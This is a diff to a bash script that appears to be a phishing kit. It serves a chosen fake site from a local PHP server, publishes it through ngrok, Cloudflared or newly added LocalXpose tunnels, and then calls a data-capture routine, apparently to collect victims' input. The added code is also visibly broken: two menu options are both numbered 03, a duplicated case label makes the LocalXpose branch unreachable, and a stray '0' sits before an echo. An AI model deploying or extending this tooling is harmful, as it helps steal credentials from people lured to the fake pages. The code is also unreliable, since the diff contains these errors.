@@ -240,23 +240,6 @@ download_ngrok() {
         fi
 }
 
-## Download Cloudflared
-download_cloudflared() {
-        url="$1"
-        file=`basename $url`
-        if [[ -e "$file" ]]; then
-                rm -rf "$file"
-        fi
-        wget --no-check-certificate "$url" > /dev/null 2>&1
-        if [[ -e "$file" ]]; then
-                mv -f "$file" .server/cloudflared > /dev/null 2>&1
-                chmod +x .server/cloudflared > /dev/null 2>&1
-        else
-                echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
-                { reset_color; exit 1; }
-        fi
-}
-
 ## Install ngrok
 install_ngrok() {
         if [[ -e ".server/ngrok" ]]; then
@@ -272,26 +255,6 @@ install_ngrok() {
                         download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz'
                 else
                         download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.tgz'
-                fi
-        fi
-
-}
-
-## Install Cloudflared
-install_cloudflared() {
-        if [[ -e ".server/cloudflared" ]]; then
-                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Cloudflared already installed."
-        else
-                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
-                arch=`uname -m`
-                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-                        download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
-                elif [[ "$arch" == *'aarch64'* ]]; then
-                        download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
-                elif [[ "$arch" == *'x86_64'* ]]; then
-                        download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
-                else
-                        download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
                 fi
         fi
 
@@ -330,22 +293,12 @@ ngrok_token_setup(){
 
 }
 
-## Setup website and start php server
-HOST='127.0.0.1'
-PORT='4444'
-setup_site() {
-        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
-        cp -rf .sites/"$website"/* .server/www
-        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-        cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
-}
-
 ## Start ngrok
 start_ngrok() {
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
         { sleep 1; setup_site; }
         echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
-
+        ngrok_token_check
     if [[ `command -v termux-chroot` ]]; then
         sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
     else
@@ -356,6 +309,43 @@ start_ngrok() {
         ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
         echo -e "\n ${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN} $ngrok_url"
         capture_data_check
+}
+
+## Download Cloudflared
+download_cloudflared() {
+        url="$1"
+        file=`basename $url`
+        if [[ -e "$file" ]]; then
+                rm -rf "$file"
+        fi
+        wget --no-check-certificate "$url" > /dev/null 2>&1
+        if [[ -e "$file" ]]; then
+                mv -f "$file" .server/cloudflared > /dev/null 2>&1
+                chmod +x .server/cloudflared > /dev/null 2>&1
+        else
+                echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
+                { reset_color; exit 1; }
+        fi
+}
+
+## Install Cloudflared
+install_cloudflared() {
+        if [[ -e ".server/cloudflared" ]]; then
+                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Cloudflared already installed."
+        else
+                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+                arch=`uname -m`
+                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+                        download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
+                elif [[ "$arch" == *'aarch64'* ]]; then
+                        download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
+                elif [[ "$arch" == *'x86_64'* ]]; then
+                        download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
+                else
+                        download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
+                fi
+        fi
+
 }
 
 ## Start Cloudflared
@@ -378,6 +368,63 @@ start_cloudflared() {
         capture_data_check
 }
 
+## Install LocalXpose
+install_localxpose() {
+	if [[ -e ".server/loclx" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+		else
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+		fi
+	fi
+}
+
+auth_localxpose() {
+	./.server/loclx -help > /dev/null 2>&1 &
+	sleep 1
+	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
+
+	[ "$(./.server/loclx account status | grep Error)" ] && {
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		sleep 3
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+		[[ $loclx_token == "" ]] && {
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+		} || {
+			echo -n "$loclx_token" > $auth_f 2> /dev/null
+		}
+	}
+}
+
+## Start LocalXpose 
+start_loclx() {
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; auth_localxpose; }
+	echo -e "\n"
+	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+	else
+		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+	fi
+
+	{ sleep 12; clear; banner; }
+	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}http://$loclx_url"
+	capture_data
+}
+
 ## Start localhost
 start_localhost() {
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
@@ -385,6 +432,16 @@ start_localhost() {
         { sleep 1; clear; banner; }
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
         capture_data_check
+}
+
+## Setup website and start php server
+HOST='127.0.0.1'
+PORT='4444'
+setup_site() {
+        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+        cp -rf .sites/"$website"/* .server/www
+        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+        cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
 ## Get IP address
@@ -528,9 +585,9 @@ tunnel_menu() {
         { clear; banner; }
 echo -e " "
 echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
-echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Buggy${RED}]"
-echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]"
-
+echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
+echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
+echo -e "${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
 
         read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
 
@@ -541,6 +598,8 @@ echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}
                         start_ngrok;;
                 3 | 03)
                         start_cloudflared;;
+		3 | 03)
+                        start_loclx;;
                 *)
 0                       echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; tunnel_menu; };;
@@ -1853,7 +1912,6 @@ dependencies
 xpermission
 install_ngrok
 install_cloudflared
-ngrok_token_check
 clear
 mainmenu
 
